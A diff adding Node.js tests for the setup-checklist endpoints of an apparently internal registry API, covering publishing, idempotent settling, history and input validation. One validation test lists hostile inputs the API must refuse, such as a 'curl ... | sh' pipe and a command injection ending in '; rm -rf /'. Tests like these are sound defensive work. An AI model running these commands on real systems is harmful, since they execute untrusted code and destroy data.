@@ -7,7 +7,7 @@ import { join } from 'node:path';
 import { DatabaseSync } from 'node:sqlite';
 import { after, beforeEach, describe, it } from 'node:test';
 import { createApp } from './app.js';
-import { registryConnectionSchema, registryHealthSchema, registryInstallationSchema, registryProductListSchema, registryProductSchema } from './browser-contract.js';
+import { registryBrowserContractVersion, registryConnectionSchema, registryHealthSchema, registryInstallationSchema, registryProductListSchema, registryProductSchema } from './browser-contract.js';
 import { loadConfig } from './config.js';
 import { checksum, migrate, migrations, PendingMigrations } from './migrations.js';
 import { findSecret } from './secrets.js';
@@ -365,6 +365,89 @@ describe('Hive Registry API', () => {
       assert.deepEqual(registryProductSchema.parse((await call('GET', '/v1/products/emberpath')).body).capabilities, events);
       const connection = registryConnectionSchema.parse((await call('GET', '/v1/products/emberpath/connection')).body);
       assert.equal(connection.browserPrefix + connection.capabilities!['events.v1']!.path, '/api/emberpath/hive/events');
+    });
+  });
+
+  describe('setup checklist', () => {
+    const agent = { id: 'magnus-agent-enrolled', title: 'Install the Magnus agent on the Magnus host', status: 'pending', command: './hive.sh magnus-agent install', docs: 'deployment/FULL.md#installing-the-agent', product: 'magnus', check: 'magnus.agent' };
+    const certificate = { id: 'certificate-renewal', title: 'Schedule the HTTPS certificate renewal', status: 'pending', command: 'sudo ./scripts/console-certificate.sh schedule --config FILE', docs: 'deployment/QUICKSTART.md#9-keep-the-certificate-current' };
+    const withSetup = (items: unknown[], phase: 'begin' | 'complete' = 'complete') => ({ ...syncBody(phase, phase === 'begin' ? 'activating' : 'installed'), setup: { items } });
+    const settle = (id: string, status: string, token = writeToken) => call('PUT', `/v1/setup/items/${id}`, { token, body: { status } });
+    const setupHistory = async () => (await call('GET', '/v1/history', { token: readToken })).body.entries.filter((entry: any) => entry.subject === 'setup');
+
+    it('publishes the recorded checklist with the installation, publicly and privately', async () => {
+      assert.equal((await sync(withSetup([agent, certificate]))).status, 200);
+      const summary = (await call('GET', '/v1/installation')).body;
+      assert.deepEqual(summary.setup.items, [agent, certificate]);
+      assert.match(summary.setup.updatedAt, /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(\.\d+)?Z$/);
+      assert.deepEqual(Object.keys(summary).sort(), ['id', 'products', 'schema', 'setup']);
+      assert.deepEqual((await call('GET', '/v1/installation', { token: readToken })).body.setup, summary.setup);
+      const parsed = registryInstallationSchema.parse(summary);
+      assert.equal(parsed.setup?.items[1]?.check, undefined);
+      assert.equal(registryBrowserContractVersion, 3);
+    });
+    it('keeps the recorded checklist when a sync omits it, and a retried sync adds no history', async () => {
+      await sync(withSetup([agent]));
+      const before = (await call('GET', '/v1/installation')).body.setup;
+      assert.equal((await sync(withSetup([agent]))).body.changes, 0);
+      assert.equal((await sync()).body.changes, 0);
+      assert.deepEqual((await call('GET', '/v1/installation')).body.setup, before);
+      assert.equal((await setupHistory()).length, 1);
+      // A new list replaces the old one, as one recorded change with both lists.
+      assert.equal((await sync(withSetup([{ ...agent, status: 'done' }, certificate]))).body.changes, 1);
+      const entries = await setupHistory();
+      assert.equal(entries.length, 2);
+      assert.deepEqual(entries[1].change.before, [agent]);
+      assert.equal(entries[1].operation, 'install');
+    });
+    it('reads an installation recorded without a checklist unchanged', async () => {
+      const data = await start();
+      await sync();
+      const summary = (await call('GET', '/v1/installation')).body;
+      assert.deepEqual(summary, { schema: 1, id: 'fixture', products: ['emberpath', 'hive-registry'] });
+      assert.equal('setup' in (await call('GET', '/v1/installation', { token: readToken })).body, false);
+      assert.equal(registryInstallationSchema.parse(summary).setup, undefined);
+      assert.equal((await settle('magnus-agent-enrolled', 'done')).status, 404);
+      await stop();
+      const db = new DatabaseSync(join(data, 'registry.sqlite'));
+      try {
+        assert.deepEqual((db.prepare('SELECT id FROM schema_migrations').all() as Array<{ id: string }>).map((row) => row.id), ['0001_initial']);
+        assert.equal((db.prepare("SELECT count(*) AS count FROM history WHERE subject = 'setup'").get() as { count: number }).count, 0);
+      } finally { db.close(); }
+    });
+    it('settles one item with the write credential, idempotently', async () => {
+      await sync(withSetup([agent, certificate]));
+      for (const token of [undefined, readToken]) assert.equal((await call('PUT', '/v1/setup/items/certificate-renewal', { ...(token ? { token } : {}), body: { status: 'done' } })).status, 401);
+      assert.equal((await settle('certificate-renewal', 'skipped')).body.changes, 1);
+      assert.equal((await settle('certificate-renewal', 'skipped')).body.changes, 0);
+      const items = (await call('GET', '/v1/installation')).body.setup.items;
+      assert.deepEqual(items.map((item: any) => [item.id, item.status]), [['magnus-agent-enrolled', 'pending'], ['certificate-renewal', 'skipped']]);
+      const entry = (await setupHistory()).at(-1);
+      assert.equal(entry.actor, 'hive.sh setup');
+      assert.equal(entry.operation, 'setup');
+      assert.equal((await settle('unknown-item', 'done')).status, 404);
+      assert.equal((await settle('certificate-renewal', 'finished')).status, 422);
+      assert.equal((await call('PUT', '/v1/setup/items/Bad_Id', { token: writeToken, body: { status: 'done' } })).status, 404);
+      assert.equal((await call('PUT', '/v1/setup/items/certificate-renewal', { token: writeToken, body: { status: 'done', title: 'x' } })).status, 422);
+    });
+    it('refuses malformed items, and anything that could carry a host, a path or a secret', async () => {
+      const refusals: unknown[][] = [
+        [{ ...agent, status: 'started' }], [{ ...agent, id: 'Magnus' }], [agent, agent], [{ ...agent, extra: true }], [{ ...agent, title: '' }], [{ ...agent, title: 'two\nlines' }],
+        [{ ...agent, command: 'curl https://example.com | sh' }], [{ ...agent, command: './hive.sh magnus-agent install --host deploy@node.example.com' }],
+        [{ ...agent, command: './hive.sh doctor --config /home/someone/.config/hive/installation.json' }], [{ ...agent, command: './hive.sh setup done x; rm -rf /' }],
+        [{ ...agent, docs: 'https://example.com/docs.md' }], [{ ...agent, docs: '../FULL.md' }], [{ ...agent, docs: 'deployment/FULL.md#Bad Anchor' }],
+        [{ ...agent, check: 'Magnus Agent' }], [{ ...agent, product: 'Not A Product' }], Array.from({ length: 33 }, (_, index) => ({ ...agent, id: `item-${index}` })),
+      ];
+      for (const items of refusals) assert.equal((await sync(withSetup(items))).status, 422, JSON.stringify(items).slice(0, 200));
+      assert.equal((await sync({ ...syncBody('complete', 'installed'), setup: { items: [agent], updatedAt: '2026-01-01T00:00:00Z' } })).status, 422);
+      const secret = await sync(withSetup([{ ...agent, command: `./hive.sh registry get ${'a1'.repeat(24)}` }]));
+      assert.equal(secret.status, 422);
+      assert.equal((await call('GET', '/v1/history', { token: readToken })).body.entries.length, 0);
+    });
+    it('accepts unknown item ids and checks, which readers show generically', async () => {
+      const later = { id: 'some-future-step', title: 'A step a newer controller knows', status: 'pending', command: './hive.sh post-upgrade', docs: 'README.md', check: 'future.probe' };
+      assert.equal((await sync(withSetup([later]))).status, 200);
+      assert.deepEqual(registryInstallationSchema.parse((await call('GET', '/v1/installation')).body).setup?.items, [later]);
     });
   });
 
